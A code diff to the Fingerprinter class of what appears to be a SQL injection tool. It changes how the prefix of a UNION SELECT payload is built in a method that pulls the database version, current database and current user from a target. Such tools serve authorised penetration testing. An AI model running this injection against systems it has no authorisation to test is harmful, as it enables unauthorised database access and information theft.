@@ -87,12 +87,16 @@ class Fingerprinter:
 
     # ------------------------------------------------------------------
     def _version_via_union(self, fp: Fingerprint):
+        from ..tampers import form_sep
         n = self.inj.column_count or 2
         cols = ["null"] * n
         pos = (self.inj.echo_positions or [1])[0] - 1
         cols[pos] = "concat_ws(0x7e,version(),database(),user())"
         core = apply_form("union select " + ",".join(cols), self.inj.form)
-        r = self.s.request_value(f"0{self.inj.closure}{core}{self.inj.comment}")
+        pre = f"0{self.inj.closure}"
+        if not self.inj.closure:
+            pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
+        r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
         m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^\s~]*)~([^~\s<]+)~([^\s~<]+)", r.body)
         if m:
             fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)
